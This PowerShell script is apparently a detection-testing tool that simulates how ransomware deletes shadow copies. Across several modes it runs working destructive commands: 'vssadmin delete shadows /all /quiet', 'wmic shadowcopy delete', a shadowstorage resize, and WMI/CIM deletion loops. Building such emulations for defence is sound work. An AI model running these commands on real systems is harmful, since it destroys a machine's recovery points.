<#
.SYNOPSIS
Shadow Copy Deletion Simulator

.DESCRIPTION
Simulates different type of shadow copy deletion as implemented by the different ransomware groups
*PLEASE BE AWARE THAT THIS SIMULATOR WILL DELETE YOUR REAL SHADOW COPIES ON THE DEVICE*
*YOU MAY WANT TO EXECUTE IT ON A CLEAN BOX*
 
.PARAMETER Mode
The type of shadow copy deletion operation vssadmin or wmi delete all, resize, delete through iteration, etc...
There is an option to simulate all together by passing parameter "All"
 
.PARAMETER Volume
The targeted volume for shadow copy deletion
 
.EXAMPLE
Invoke-ShadowDeleteSIM -Mode CimDelete -Volume C:\\
Invoke-ShadowDeleteSIM -Mode All -Volume C:\\

#>
function Invoke-ShadowDeleteSIM {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('All','VssDeleteAll', 'WmiDeleteAll', 'VssResize', 'DeleteEach', 'CimDelete', 'NativeDelete')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [Parameter(Mandatory = $true, ParameterSetName = "ShadowDelete")]
        [String]$Volume
    )

    Process {

        switch ($Mode) {
            {@("VssDeleteAll", "All") -contains $_} 
            {
                Invoke-CimMethod -MethodName Create -ClassName Win32_ShadowCopy -Arguments @{ Volume= $Volume }
                Sleep(1)
                vssadmin delete shadows /all /quiet  
                Sleep(1)         
            }
            
            {@("WmiDeleteAll", "All") -contains $_} 
            {
                Invoke-CimMethod -MethodName Create -ClassName Win32_ShadowCopy -Arguments @{ Volume= $Volume }
                Sleep(1)
                wmic shadowcopy delete /nointeractive   
                Sleep(1)          
            }

            {@("VssResize", "All") -contains $_} 
            {
                Invoke-CimMethod -MethodName Create -ClassName Win32_ShadowCopy -Arguments @{ Volume= $Volume }
                Sleep(1)
                vssadmin resize shadowstorage /for=c: /on=c: /maxsize=402MB
                vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded  
                Sleep(1)       
            }

            {@("DeleteEach", "All") -contains $_} 
            {
                Invoke-CimMethod -MethodName Create -ClassName Win32_ShadowCopy -Arguments @{ Volume= $Volume }
                Invoke-CimMethod -MethodName Create -ClassName Win32_ShadowCopy -Arguments @{ Volume= $Volume }
                Sleep(1)
                Get-WmiObject Win32_Shadowcopy | ForEach-Object { $_.Delete(); }                 
                Sleep(1)       
            }

            {@("CimDelete", "All") -contains $_} 
            {
                Invoke-CimMethod -MethodName Create -ClassName Win32_ShadowCopy -Arguments @{ Volume= $Volume }
                Sleep(1)
                Get-CimInstance Win32_ShadowCopy | Remove-CimInstance                
                Sleep(1)       
            }
            
        }
    }
}
